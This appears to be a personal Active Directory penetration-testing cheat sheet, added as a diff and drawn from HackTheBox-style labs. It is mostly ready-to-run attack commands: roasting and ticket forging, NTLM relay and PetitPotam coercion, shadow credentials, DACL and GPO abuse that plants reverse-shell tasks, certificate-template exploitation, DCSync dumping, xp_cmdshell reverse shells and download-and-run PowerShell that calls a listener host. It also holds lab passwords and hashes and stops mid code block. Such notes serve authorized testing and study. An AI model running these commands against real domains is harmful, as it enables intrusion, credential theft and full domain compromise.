@@ -1,0 +1,2120 @@
+# Active-Directory Penetration Testing Process
+
+## Linux based
+
+:toc:
+:toclevels: 3
+
+== Table of Contents
+- <<overview,Overview>>
+- <<ports, Port Scanning>>
+- <<creds, Scenario without creds and with creds>>
+- <<phish, Phishing>>
+- <<ASREPRoast, ASREPRoast>>
+- <<Kerberoasting, Kerberoasting>>
+- <<Kerberos, Kerberos tickets>>
+- <<SMB, SMB>>
+- <<NFS, NFS>>
+- <<nats, NATS>>
+- <<NTLM, NTLM Relay Attack>>
+- <<Backups, Backups>>
+- <<Bloodhound, Bloodhound>>
+- <<shadowcreds, ShadowCreds>>
+- <<perms, Permisions in AD>>
+  * <<generetic, GenereticAll>>
+  * <<generetic, GenereticWrite>>
+  * <<DCSync, DCSync>>
+  * <<ForceChangePassword, ForceChangePassword>>
+  * <<Groups, Groups>>
+  * <<WriteDacl, WriteDacl>>
+  * <<GPO, GPO abuse>>
+  * <<write,Write Owner>>
+  * <<atribute, Atributes Change>>
+  * <<AllowedToDelegate, AllowedToDelegate>>
+- <<crack, Hashcat and John>>
+  * <<hashcat, Hashcat>>
+  * <<john, John>>
+- <<templates, Vulnerable Certificate Templates>>
+- <<OpenSSL,OpenSSL>>
+- <<deleted, Deleted Object Recovery>>
+- <<rm, Remote Managment>>
+  * <<evil, Evil-Winrm>>
+  * <<xfreerdp, XfreeRDP>>
+- <<database, Databases>>
+- <<forwarding, Port-Forwarding>>
+- <<ssh, SSH>>
+- <<Delegations, Delegations>>
+- <<privesc, Privilage Escalation>>
+  * <<file, File Transfering>>
+  * <<backup, SeBackupPrivilege>>
+  * <<SeImpersonatePrivilege, SeImpersonatePrivilege>>
+  * <<dpapi,  DPAPI secrets>>
+  * <<delegation, SeEnableDelegationPrivilege>>
+  * <<cross-session, Cross-Session>>
+  * <<Credential_Dumping, Credential Dumping>>
+  * <<ToSystem, ToSystem>>
+  * <<local, Local PrivEsc>>
+- <<amsi, AMSI>>
+- <<post-exploatation, post-exploatation>>
+- <<av, AV evasion>>
+- <<trust, Domain Trusts>>
+- <<tickets,Golden,Silver,Diamond tickets generation>>
+- <<sliver, Sliver C2>>
+
+
+[[overview]]
+== Overview
+This CheatList includes basic attacks exists in *Active Directory* enviroment. Possible *attack vectors* and *methonology* , list of *commands* and *tools* with *vectors* , *privilage escalation* , *enumeration* and *others*
+
+[[ports]]
+== Port Scanning
+
+Default *TCP* port scan
+
+```bash
+nmap --top-ports 1000 -sC -sV $target
+```
+
+For more ports and bigger response
+
+```bash
+nmap -p- -sC -sV -oN file.txt $target
+```
+
+Default *UDP* ports scanning 
+
+```bash
+nmap -sU --top-ports 100 -sC -sV $target          
+```
+
+Search file with string password
+
+```bash
+cd wapt && grep -R 'password'
+```
+
+DNS request
+
+```bash
+dig domain@ip
+```
+
+[[creds]]
+== Scenario without creds and with creds
+
+Two scenarios is possible ...
+
+[[phish]]
+== Phishing
+
+If you have a website where exists staff or company members or team and you find some password you can try to write first name and last name into wordlist and create a possible usernames wordlist
+
+```bash
+./username-anarchy -i usernames.txt  > crafted-usernames.txt
+```
+
+Then `brute-force` usernames via AS-REP or BurpSuite if you had a leaked password.
+
+Also if you have a upload file page where you can upload `word` `pdf` `zip` and other files look up in recent vulnerabilities or CVE sort by `NTLM` hash 
+
+```bash
+responder -I tun0
+```
+
+Also you can phish creds with multiple ways as smb shares using a `msfconsole` module `multidrop` 
+
+Crafting a links in emails with triggers user to download your reverse shell `.exe` do this with `Sliver`
+
+[[ASREPRoast]]
+== ASREPRoast
+
+This `command` returns hash of all users which doesn't have a Kerberos pre-authentication or not required
+
+
+*Without Auth*
+
+```bash
+
+nxc ldap $target -u 'username' -p '' --asreproast output.txt
+```
+
+*By wordlist*
+
+If exists dumped or some wordlits of users
+
+```bash
+python3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'FuckPass!@' 
+
+nxc ldap $target -u user.txt -p '' --asreproast output.txt
+```
+
+*With authentication*
+
+
+```bash
+nxc ldap $target -u 'username' -p 'password' --asreproast output.txt
+```
+
+If failture named `domain name resolution fail`
+
+```bash
+nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name
+```
+
+More info about https://www.netexec.wiki/ldap-protocol/asreproast[here]
+
+Anouther trick about asrep-roasting it is if we got a user who doesn't require preauth to domain we can request a ticket via this user
+
+```bash
+impacket-GetUserSPNs rebound.htb/  -no-preauth jjones -usersfile usernames.txt -dc-host 10.129.232.31
+```
+
+Where jjones not requieres preauth and usernames.txt it's all users in domain
+
+Requires new versions of `impacket`
+
+[[Kerberoasting]]
+== Kerberoasting
+
+Kerberoasting is an attack against Active Directory where an attacker requests Kerberos service tickets for service accounts and then cracks them offline to obtain their passwords. It works because the tickets are encrypted with the service account’s password hash, which may be weak or unchanged for long periods.   
+Also can be done via tool `nxc` netexec
+
+```bash
+nxc ldap $target -u 'username' -p 'username' --kerberoast output.txt
+```
+
+*Kerberoasting via AS-REP Roasting*
+
+nxc ldap $target -u 'username' -p '' no-preauth-targets kerberoastable.list --kerberoasting output.txt
+```
+
+Brute-Force users in AD by wordlist tool `kerbrute`
+
+```bash
+kerbrute userenum --dc 'AWSJPDC0522.shibuya.vl'  -d shibuya.vl -t 10 ~/wordlists/Usernames/Names/names.txt
+```
+
+If exists error `KDC_ERR_CLIENT_REVOKED` need to enable user in AD
+
+```bash
+bloodyAD --host 10.10.10.10 -d domain -u compromised_user -p 'password' remove uac 'target_user' -f ACCOUNTDISABLE
+```
+
+[[Kerberos]]
+== Kerberos ticket
+
+This vuln can be exploited by generation ticket as Administrator for different services
+
+```bash
+impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl \
+-domain-sid S-1-5-21-2330692793-3312915120-706255856 \
+-nthash 69596c7aa1e8daee17f8e78870e25a5c \
+-dc-ip 10.129.197.45 \
+-domain breach.vl \
+-user-id 500 Administrator
+```
+
+It's a command that i used in htb machine to generate *Kerberos* ticket as Administrator to `MSSQL` service
+
+`-spn MSSQLSvc/breachdc.breach.vl` -> The Kerberos service you are creating a ticket for.
+
+`-domain-sid S-1-5-21-…` -> The SID of the domain where the ticket belongs.
+
+`-nthash <hash>` -> The NTLM hash used as the cryptographic key to sign the ticket.
+
+`-dc-ip 10.129.197.45` -> The IP address of the domain controller.
+
+`-domain breach.vl` -> The Active Directory domain name.
+
+`-user-id 500` -> The RID of the user (500 = built-in Administrator).
+
+
+If nessesary to do auth with `Kerberos Authentication` tool `impacket-getTGT` returns a `<user>.ccache` file
+requirements: Target username and password
+
+```bash
+impacket-getTGT  domain/'username':'password'
+```
+
+Then when it's needed to use kerberos auth for any command , that means that nxc smb can be replaced
+
+```bash
+KRB5CCNAME=user.ccache nxc smb ...
+```
+
+If will be a problem with connection , realms configure /etc/krb5.conf
+
+```bash
+[libdefaults]
+	default_realm = FRIZZ.HTB
+	[realms]
+	FRIZZ.HTB = {
+	kdc = frizzdc.frizz.htb
+	admin_server = frizzdc.frizz.htb
+	}
+	[domain_realm]
+	.frizz.htb = FRIZZ.HTB
+	frizz.htb = FRIZZ.HTB
+```
+
+machine example TheFrizz HTB
+
+Anouther way to configure '/etc/krb5.conf' correctly it's add by 'netexec'
+
+```bash
+nxc smb dc.domain -u username -p password --generate-krb5-file name.krb5
+
+sudo cp name.krb5 /etc/krb5.conf
+```
+
+
+Also for each kerberos auth must be a same time with target machine
+
+```bash
+sudo ntpdate <target_ip>
+```
+
+[[SMB]]
+== SMB
+
+Enumerate *groups* , *users* via `smb`
+
+```bash
+
+nxc smb $target -u 'username' -p 'password' --rid # also --rid-brute
+```
+
+Try to *anonymous* log into `shares`, can be putted into username field `guest` with no-pass
+
+```bash
+nxc smb $target -u '' -p '' --shares # guest
+```
+
+*With Auth*
+
+```bash
+smbclient '//$target/$Share'  -U username
+```
+
+*Anonymous*
+
+```bash
+smbclient '//$target/$Share' -N
+```
+
+Take all files in Share
+
+```bash
+mget *
+```
+
+Method maybe users have a pass which mathes with their username
+
+```bash
+nxc smb $target -u users.txt -p users.txt
+```
+
+Or check one pass for wordlist of users
+
+```bash
+nxc smb $target -u users.txt -p 'some_pass'
+```
+
+Also it a little bit touches *smb* if target have website and open smb port with *LFI* vuln 
+
+```bash
+http://somesite.com/index.php?file=image
+```
+
+So `image` can be replaced as `smb share` and hash can be cathed
+
+Replace `image` 
+
+```bash
+http://somesite.com/index.php?file=\\10.10.10.10\Share
+```
+
+don't forgot to start `responder` in same network as target, replace `10.10.10.10` by your ip
+
+Check all users by smb and write them to file
+
+```bash
+nxc smb domain -u username -p 'password' --rid-brute | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee usernames.txt
+```
+
+Auth with kerberos ticket without username and password
+
+```bash
+nxc smb dc.domain  --use-kcache # -k optional
+```
+
+If exists some service accounts possible that their password is written in clear-text
+
+```bash
+nxc smb domain -u '' -p '' --users
+```
+
+[[NFS]]
+== NFS
+
+It's something simmular to *SMB* but mostly a linux technology
+
+*Enumeration*
+
+```bash
+nxc nfs domain --shares 
+```
+
+List shares
+
+```bash
+nxc nfs domain --share '/Share' --ls '/'
+```
+
+Download file
+
+```bash
+nxc nfs domain --get-file '/path/to/file/file.pdf' file.pdf
+```
+
+
+[[nats]]
+== NATS
+
+It's a service that can be runned in Windows machine and it's also a point for testing
+
+Making a request by server to our server to see some details about using tool `nsupdate` to modify a `DNS` requests
+
+Basic syntax to send request to our server
+
+```bash
+$ nsupdate 
+> server target_ip
+> zone domain
+> update add domain@ip
+# could not read owner ttl
+> update add domain 10 A local_ip
+> send
+```
+
+Start server
+
+```bash
+./nats-server -V # for verbous
+```
+
+Also if some creds in *REDACTED* can be used a *WireShark* to analyze request maybe it's not encoded
+
+*NATS* main enum
+
+```bash
+# info about user
+./nats -s nats://domain:4222 account info --user username --password password
+# shows JetStream streams which are allowed to view by compromised user
+./nats -s nats://domain:4222 stream ls --user username --password password
+# shows a messages from all streams
+./nats -s nats://domain:4222 stream view -a --user username --password password
+```
+
+
+[[NTLM]]
+== NTLM Relay Attack
+
+If exists *WRITE* permision in the `share` can be crafted a phishing link to catch `hashes` using module in tool `netexec` named *Slinky* 
+
+Also is needed to start `responder` with `sudo` perms in target network
+
+Agaist `tun0` can be anouther, 
+
+Permisions
+```bash
+sudo responder -I tun0
+```
+
+
+
+When `responder` started craft `phish-link`
+
+
+
+
+```bash
+nxc smb $target -u 'username' -p 'passwords'  -M slinky -o SHARE=Share  NAME=phish SERVER=$server_in_responder 
+```
+
+Phish by `msfconsole` 
+```bash
+use auxiliary/fileformat/multidrop 
+```
+
+If NTLM is disabled but you must have it for some tool
+
+Right part of hash is always returned but Left part not always so
+
+*LM* null hash `aad3b435b51404eeaad3b435b51404ee`
+
+Second part of NTLM relay attack it is trigger target computer to auth to domain controller throught our listener this attack named as Man-In-The-Middle
+ attacks it's a god practice like PetitPotam so can be trigged by netexec module coerse_plus
+
+Find a vulnerable trigger in system 
+
+```bash
+nxc smb 10.129.232.31 -u ldap_monitor -p '1GR8t@$$4u' -M coerse_plus
+```
+
+So if vulnerability exists we can use a `PetitPotam.py` for more advanced exploitation or netexec module `coerse_plus`
+
+If we can create a machines check 
+
+```bash
+nxc smb 10.129.232.31 -u ldap_monitor -p '1GR8t@$$4u' -M maq
+```
+
+We can add `SPN` with our `DNS` record for example our local ip `10.10.10.10` . If we have a permission to write a DNS record to other computers it's better
+
+Start `NTLM` relay listener
+
+```bash
+impacket-ntlmrelayx -t ldaps://192.168.100.100 -smb2support -i -domain mist.htb
+```
+
+```bash
+nxc smb 192.168.100.101  -u brandon.keywarp -H db03d6a77a2205bc1d07082740626cc9 -M coerce_plus -o NETHOD=PetitPotam LISTENER=some_dns_which_was_modified
+```
+
+
+
+```bash
+python3 PetitPotam.py -u brandon.keywarp -no-pass -hashes ':db03d6a77a2205bc1d07082740626cc9' -pipe all 'MS01@5050/colosion'  192.168.100.101
+```
+
+Not about a `NTLM` phishing but a `ldap-shell` capture
+
+Malicious .lnk creation `Folder -> Create a shortcut`
+
+Paste payload
+
+```bash
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://listener_ip' -UseDefaultCredentials"
+```
+
+I don't file how to do this in linux machine
+
+And start a `impacket-ntlmrelayx`
+
+```bash
+sudo ntlmrelayx.py -t ldaps://dc_ip -wh listener_ip --http-port '80,8080' -i --no-smb-server
+```
+
+Connect to `ldap-shell`
+
+```bash
+nc.exe 127.0.0.1 11000
+```
+
+
+[[Backups]]
+== Backups
+
+If obtained some backups of system with files extension *.wim* possible to dump secrets
+
+1.Mount system backup
+
+```bash
+sudo wimmount AWSJPWK0222-01.wim 1 /mnt/wim --readonly
+```
+
+2.Then as root find sam and system
+
+3.Dump secrets as in SeBackupPrivilege section
+
+[[Bloodhound]]
+== Bloodhound
+
+*BloodHound* with Neo4j is used to *map and analyze* relationships inside an Active Directory environment. By storing AD objects and their connections in a Neo4j graph database, BloodHound helps security teams.*Identify hidden attack paths, privilege escalation routes, and misconfigurations* that could be exploited to gain  higher access in the domain.
+
+If port ralated to `ldap` is open can be grabbed info about system , also must be compromised user with valid creds.
+
+```bash
+bloodhound-python -d '$target_domain' -u 'username' -p 'password' -dc '$target_domain_controller' -c all -ns $target_ip
+```
+
+`Bloodhound` cathes an information about *Active Directory* in `.json` files
+
+```bash
+sudo neo4j start    
+```
+
+`neo4j` start database
+
+```bash
+bloodhound-cli  
+```
+
+`bloodhound-cli` starts bloodhound in *cli* , after upload all json files and start analyze
+
+If Remote Management exist 
+
+```bash
+SharpHound.exe
+```
+
+[[shadowcreds]]
+== ShadowCreds
+
+Creating Shadow Credentials is always better that changing password of victim account because is more OPSEC technique and doesn't break services which runned in victim account. Definition of Shadow Credentials is anouther way of authentication into victim account.We don's change password we are adding an anouther method of auth
+
+```bash
+certipy-ad -debug shadow auto -u svc-alfresco@htb.local -p s3rvice -account target_user -dc-ip 10.10.10.10 
+```
+
+[[perms]]
+== Permisions in AD
+
+
+Perms which can be enumerated by tool `bloodhound`
+
+
+[[generetic]]
+=== GenericAll
+
+```bash
+certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip 10.1.107.118
+```
+
+This permision over user gives a *full controll*, used to *change password* (common) or anouther things
+
+Changing pass by tool `BloodyAD`
+
+```bash
+bloodyAD --host "$target" -d 'dc01.$target_domain' -u  'user' -p  'pass' set password 'user2' 'pass2'
+```
+So it's can be as "Change password of user2 by user with pass and change to pass2",
+
+
+Changing pass in PowerShell by `PowerView.ps1`
+
+```bash
+$SecPassword = ConvertTo-SecureString 'FuckPass@!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('domain\target_user', $SecPassword)
+```
+
+
+
+[[generetic2]]
+=== GenericWrite
+*Method 1*
+
+This permision over user can be used for changing atributes of target object so can be automated by tool `targetedKerberoast.py` , by atribute *servicePrincipalName* adds SPN and do kerberoasting. Could be cathed a hash of target user catch kerberos hash of user
+
+```bash
+python3 targetedKerberoast.py -v -d '$target_domain' -u 'username' -p 'password' 
+```
+*Method 2*
+Can be logged as targed user to system when a password is strong or some service accounts, tool which can be used `pywhisker` && `certipy-ad` && `PKINITtools` 
+
+1.Check if target user have *Shadow Credentials* 
+
+```bash
+pywhisker -d domain -u "username" -p "password" --target "target_object" --action "list"
+```
+    
+2.Add *KeyCredentialLink* to target user in AD , it is doing because after taking *Kerberos TGT* as a target user
+
+```bash
+pywhisker -d domain -u "username" -p "password" --target "target_object" --action "add" --filename some_file
+```
+
+3.Add *Shadow Creds* to user , export `.pfx` certificate can be used only `certipy-ad` without `pywhisker`
+
+```bash
+certipy-ad shadow auto -u username@domain -p password -account target_user
+```
+
+4.Take a key from `pywhisker` , creates a `.ccache` file , takes Ticket Granting Ticket (*TGT*) , file `.ccache` it's where to write a TGT ticket
+
+```bash
+python3 ~/htb/Windows/PKINITtools/gettgtpkinit.py -cert-pfx "username.pfx" -pfx-pass '01mdadw0wadasdwm3ffL' domain/target_username target_username.ccache
+```
+
+4.1 Export KRB5CCNAME as a file 
+
+```bash
+export KRB5CCNAME=target_username.ccache 
+```
+
+5.Take a `NTLM` hash of target user, after can be logged in `evil-winrm`, Tools use a ASP-REP Roasting via PRIKIT key
+
+```bash
+python3 ~/htb/Windows/PKINITtools/getnthash.py -key 'c5cbc1fa0e5b8d29091864f2b1d16c4ecdcdfe7dcb331b0b4bc87d49502212dc' domain/target_username
+```
+
+Links:
+ https://github.com/ShutdownRepo/pywhisker[pywhisker]
+ https://www.hackingarticles.in/shadow-credentials-attack/[shadow-credentials-attack]
+
+*GenericWrite* perm over group gives opportunity to add yourself to group
+
+```bash
+bloodyAD --host 10.10.10.10 -d domain -u 'username' -p 'password' add groupMember  'target_group' 'username'
+```
+
+[[DCSync]]
+=== DCSync 
+
+This perm is merge between *GetChanges* and *GetChangesAll* , All *secrets* can be dumped by `impacket-secretsdump`
+
+```bash
+impacket-secretsdump $domain/'$user':'$pass'@'$domain_ip'
+```
+
+
+
+[[ForceChangePassword]]
+=== ForceChangePassword
+
+Password of target user can be changed same can be done by tool `bloodyAD`
+
+```bash
+bloodyAD --host "$target" -d 'dc01.$target_domain' -u  'user' -p  'pass' set password 'user2' 'pass2'
+```
+
+[[Groups]]
+=== Groups
+
+If compromised user exists in group which have *GenericAll* or other privileges over anouther group compromised user can add self to target group
+
+```bash
+bloodyAD --host "$target" -d 'dc01.$target_domain' -u  'user' -p  'pass' add groupMember '$target_group' 'user'
+```
+
+[[WriteDacl]]
+=== WriteDacl
+
+WriteDacl this perm give us permision to modify the *Discretionary Access Control List(DACL)* so we can up privileges to whatever object in Active Directory. Can be done with PowerShell script *PowerView.ps1*
+
+Copy PowerView to target machine
+
+```bash
+python3 -m http.server 80 # kali machine
+
+curl http://$your_ip/PowerView.ps1 -O PowerView.ps1 # target machine
+```
+
+Anouther way 
+
+Create a new user
+
+```bash
+net user john password! /add /domain
+```
+
+Anouther way more shortly
+
+```bash
+iex (iwr -usebasicparsing http://10.10.10.10/PowerView.ps1)
+```
+
+Add our user as object to group with *GenericAll* perm 
+
+```bash
+add-domainobjectacl -rights "all" -targetidentity "$target_user" -principalidentity "$compromised_user"
+```
+
+Set password for target user
+
+```bash
+$cred = ConvertTo-SecureString 'some_pass' -AsPlainText -Force
+# 
+set-domainuserpassword $target_user -accountpassword $cred
+```
+
+Anouther way 
+
+1.Create a new user
+
+```bash
+net user john password! /add /domain
+```
+or
+
+```bash
+bloodyAD -u 'svc-alfresco' -p 's3rvice' --host forest.htb.local -d htb.local add user 'john2' 'password'
+```
+
+2.Add user to group which have a WriteDACL over domain
+
+```bash
+bloodyAD -u 'svc-alfresco' -p 's3rvice' --host forest.htb.local -d htb.local add groupMember  'EXCHANGE WINDOWS PERMISSIONS' 'john2' 
+```
+
+3.Add DCSync to user
+
+```bash
+bloodyAD -u 'john2' -p 'password' --host forest.htb.local -d htb.local add dcsync john2
+```
+
+4.Dump secrets with DCSync 
+
+
+[[write]]
+== Write Owner
+
+So is's a perm which be demostrated over some group so main goal to make low priv user that have a *WriteOwner* perms over group and in goal low-priv user must be a *Group Owner* in group
+
+1. Change a owner of object
+
+```bash
+impacket-owneredit -action write -new-owner 'low_priv_usr' -target-dn 'CN=Group_with_replacing,CN=Users,DC=domain.,DC=.domain' 'domain'/'low_priv_usr':'password' -dc-ip 10.10.10.10
+```
+2. Give yourself a perm to change other users in group
+
+```bash
+impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'low_priv_usr' -target-dn 'CN=Group_with_replacing,CN=Users,DC=domain.,DC=.domain' 'domain'/'low_priv_usr':'password' -dc-ip 10.10.10.10
+```
+
+3. After we can add yourself to target group with write perms to other users can be done with `BloodyAD` or `net rpc` or others i will go with `net rpc`
+
+```bash
+net rpc group addmem "target_group" "low_priv_user" -U "domain"/"low_priv_user"%'password' -S "dns_domain"
+```
+
+https://www.hackingarticles.in/abusing-ad-dacl-writeowner/[abusing-ad-dacl-writeowner]
+
+Write Owner over user account
+
+```bash
+impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'oorend' -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'rebound.htb'/'oorend':'1GR8t@$$4u' -use-ldaps -debug -k -no-pass -dc-ip 10.129.232.31 -dc-host dc01.rebound.htb
+```
+
+[[GPO]]
+=== GPO abuse
+
+In `bloodhound` search `Effective Inbound GPOs` parametr to identify a `SID` and `NAME` of `GPO`
+
+If user have *GenericAll* of other google it over *Default Domain Policy* and *Default Domain Contraoller Policy* , great tool for exploatation this is python script `pygpoabuse` .This script will add a user to AD with creds:
+`john`  :  `H4x00r123..` 
+
+usage:
+
+```bash
+python3 pygpoabuse.py domain/user:'pass' -command "powershell -exec bypass -enc JABjAGwAaQBlAG4AdAAgA...<SNIP>...AGwAbwBzAGUAKAApAA==" -dc-ip 10.10.10.10 -gpo-id "00000000-016D-11D2-945F-00C04FB984F9"
+```
+
+Harder but more safe way if you can create a user by using `SharpGPOAbuse.exe` 
+requirements: `reverse shell`
+
+1.Create a new `GPO`
+
+```bash
+New-GPO -name 'exploit' 
+```
+
+2.Create link to `DOMAIN CONTROLLERS` group from created `GPO`
+
+```bash
+New-GPLINK -name 'exploit' -target 'OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB'
+```
+
+3.Create task which runs `powershell` command with reverse shell 
+payload search `reverse shell generator` -> PowerShell #3 (Base64)
+
+```bash
+.\SharpGPOAbuse.exe --AddComputerTask --GPOName exploit --Author exploit --TaskName RevShell --Command "powershell.exe" --Arguments "powershell -e JA<SNIP>AKAApAA=="
+```
+
+4.Update all gpo's which exists in system
+
+```bash
+gpupdate /force
+```
+
+If privious methods is not workking i recommend to create an SMB share with FullAccess to All users 
+
+```bash
+mkdir /path/to/folder_which_sharing
+```
+
+```bash
+net share C:\path\to\folder_to_share=C:\path\to\name_of_share /grant:Everyone,Full
+```
+
+```bash
+icacls "C:\AD\Tools\stdX-gp" /grant Everyone:F /T
+```
+
+This will create a share with FullControl permission 
+
+Then we modify a vulnerable GPO by `gpoddity.py` 
+
+```bash
+python3 gpoddity.py --domain domain --gpo-id 'vulnerable_gpo_id' --username user --password pass --dc-ip ip --command 'net localgroup Administrators user /add'  --rogue-smbserver-ip ip_where_hosted_created_share --rogue-smbserver-share created_share --smb-mode none
+```
+
+Also is important to copy a `GPT_out' folder to share
+
+```bash
+cp -r /path/to/GPOddity/GPT_Out/* /path/to/shared_folder
+```
+
+
+
+[[atributes]]
+== Attributes Change
+
+Change attributs by `bloodyAD` tool for exemple logonHours. It's *LDAP*!
+
+Get all fields in *LDAP* over target user
+
+```bash
+bloodyAD --host dc.domain -d domain -k -u username -p 'password' get object 'target_user'
+```
+
+Set a field over target user in AD
+
+```bash
+bloodyAD --host dc01.mirage.htb -d mirage.htb -k -u mark.bbond -p '1day@atime' set object javier.mmarshall logonhours -v '////////////////////////////' --b64
+```
+
+Objects can be different but this is a main syntax
+
+Options:
+`-gpo-id` taken from bloodhound in Node field
+
+`-command` it's a reverse shell frome this https://www.revshells.com/[site]
+
+
+
+
+[[AllowedToDelegate]]
+== AllowedToDelegate
+
+Example
+
+User `blake` has ACL `AllowedToDelegate` over `DC` . So user `blake` has a Constrained Delegation to services in Domain Controller so it's a path to all domain compromised.So i mentioned that user  `blake` has a `AlowedToDelegate SPN`  `CIFS/dc.painters.htb`
+Also i see that user `Administrator` is in `Domain Admins` group and has a privilege `AdminTo` -> `dc.painters.htb`
+
+Extract a Servise cifs ticket
+
+```bash
+impacket-getST -spn 'CIFS/dc.painters.htb' -impersonate 'Administrator' -altservice 'cifs' -k -no-pass 'painters.htb/blake'@dc.painters.htb -dc-ip 192.168.110.55
+```
+
+If i got an Admin access to file system in domain i can dump a `ntds.dit` file
+
+```bash
+impacket-secretsdump painters.htb/'Administrator'@dc.painters.htb -dc-ip 192.168.110.55 -target-ip 192.168.110.55 -use-vss -k -no-pass
+```
+
+[[crack]]
+== Hashcat and John
+
+Cracking tool used by penetration testers / red teamers. Use after dumping a hashes, open locked file by password.
+
+[[hashcat]]
+=== Hashcat
+
+If exist some hash
+
+```bash
+hashcat hash.txt  rockyou.txt     
+```
+
+Also can be modified with flags `-m` , `-a`, with wordlist of hashes when all must be cracked
+
+```bash
+hashcat -m 0 -a 0 hash_pass.txt rockyou.txt --keep-guessing -O
+```
+
+[[john]]
+=== John
+
+If exist some locked pdf, zip or anouther
+ it's all the same process
+
+```bash
+pdf2john file.pdf > hash.john 
+```
+
+For `zip` files can be used tool `zip2john`
+
+Transform pdf hash to john format
+john --show hash.john
+
+```bash
+john hash.john --wordlist:rockyou.txt
+# then
+john --show hash.john
+```
+
+[[]]
+== Vulnerable Certificate 
+
+The most common it's when service accounts have access to domain, should be checked template vulnerabilities. Named as ESC1 - ESC15 this how named vulnerabilities, the best tool to exploit this `certipy` or `certipy-ad`. More info https://www.thehacker.recipes/ad/movement/adcs/[here]
+
+* First step is find vulnerability
+
+```bash
+certipy-ad find -u user@domain -p 'pass' -dc-ip $domain_ip -vulnerable
+```
+
+Returns .txt file which contains report of vulns
+
+* Second step do request to catch template
+
+```bash
+certipy-ad req -u user -p 'password' -ca template-dc01-ca -target target_domain -template template -upn user@domain -sid S-1-1-11-3154413470-3340737026-2748725799-1601
+
+```
+
+`-template` taken from .txt file in field `TemplateName`
+`-ca` taken from .txt file in field `Certificate Subject` looks like CN=hacks-DC01-CA
+`-upn` target user in AD
+`-sid` can be taken from `bloodhound` 
+
+Returns a *.pfx* file of target user
+
+* Third step 
+
+```bash
+certipy-ad auth -pfx 'user.pfx' -dc-ip domain_ip
+```
+
+Returns a `hash` of target user
+
+It was example for `ESC1` vulnerable template
+
+*ESC4* template vulnerability can be exploit by the same way.User have a dangerous privileges over templates
+
+```bash
+certipy-ad template -u 'user@domain' -p 'pass' -template template_name -dc-ip 10.10.10.10 -write-default-configuration 
+```
+
+This step is used after `find` to make a template vulnerable to *ESC1* by exploiting dangerous privileges
+
+ESC 9 vuln cert https://www.hackingarticles.in/adcs-esc9-no-security-extension/[exploitation]
+
+[[OpenSSL]]
+== OpenSSL
+
+Check .pfx file 
+
+```bash
+openssl pkcs12 -in d.baker2.pfx -clcerts -nokeys | openssl x509 -text -noout
+```
+
+.pfx file creation with .pem 
+
+```bash
+openssl pkcs12 -in baker.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out baker.pfx
+```
+
+Check certificate .crt file
+
+```bash
+openssl x509 -in ca.crt -text -noout
+```
+
+For .pem creation needed a .key and .crt files of same user
+
+```bash
+cat .key > .pem
+cat .crt > .pem
+```
+
+But it must be ONLY certificate and key without anouther words
+
+Example of .pem file
+
+```bash
+-----BEGIN PRIVATE KEY-----
+MIIEvQIBAD<key>0fsvIYwU=
+-----END PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGrTCCBZ<cert>1pgWhM
+-----END CERTIFICATE-----
+```
+
+If key is not decrypted 
+
+```bash
+openssl rsa -in baker.key -out baker-decrypted.key
+```
+
+Check if certificate is valid .pfx by `certipy-ad auth`
+
+[[deleted]]
+== Deleted Object Recovery
+
+If we see in bloodhound a unknown SID which has interesing permissions for us we can try to recover this Deleted object
+
+See what objects is contained as `Deleted Objects` container
+
+```bash
+Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
+```
+
+```bash
+Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
+Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+```
+
+Restore object
+
+```bash
+Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+```
+
+
+[[rm]]
+== Remote Managment
+
+If user exists in group *REMOTE MANAGEMENT USERS* or *DESKTOP REMOTE MANAGEMENT USERS* remote connection to target machine is possible by `evil-winrm` or `xfreerdp`
+
+[[evil]]
+=== Evil-Winrm
+
+*Requirements* : user exists in group *REMOTE MANAGEMENT USERS*
+
+*By password*
+
+```bash
+evil-winrm -i ip -u 'user' -p 'pass'
+```
+
+*By hash*
+
+```bash
+evil-winrm -i ip -u 'user' -H 'd87640b0d83dc7f90f5f30bd6789b133'
+```
+
+
+[[xfreerdp]]
+=== XfreeRDP
+
+*Requirements* : `RDP` port is open , user exists in *DESKTOP REMOTE MANAGEMENT USERS*
+
+```bash
+xfreerdp /v:ip   /u:user   /p:'password'  /w:1920 /h:1080 /fonts /smart-sizing
+```
+
+[[database]]
+== Databases
+
+If enumerated a database in Active Directory , attacker can connect to it by tool `impacket-mssqlclient`. Also if database is running at `localhost` , must do `Port-Forwarding`. Anouther thing is `proxychains` can be configured in `/etc/proxychains.conf` next section will be about this.
+
+Connect to database without pivoting
+
+```bash
+impacket-mssqlclient 'domain'/'user':'password@@'@127.0.0.1 -windows-auth
+```
+
+It's also depens what creds you have if it windows or database creds if database creds delete `-windows-auth` flag
+
+If connection is by `SOCKS5` or some other , pivoting database in localhost
+
+```bash
+proxychains4 -q impacket-mssqlclient 'domain'/'user':'password@@'@127.0.0.1 -windows-auth
+```
+
+If it connect with anouther user which have more privileges , main goal is to take `reverse shell`.
+
+In database shell
+
+```bash
+enable_xp_cmdshell
+```
+
+Check if works
+
+```bash
+xp_cmdshell whoami
+```
+
+Reverse shell can be done go https://www.revshells.com/[here] this site creates reverse shell with your `ip` and `port` use `PowerShell #3 (Base64)` copy reverse shell command
+
+```bash
+xp_cmdshell powershell -e JAB...
+```
+
+Start listener
+
+```bash
+rlwrap nc -lvnp  9001
+```
+
+Without site can be done by `msfvenom` in `.hta` file
+
+```bash
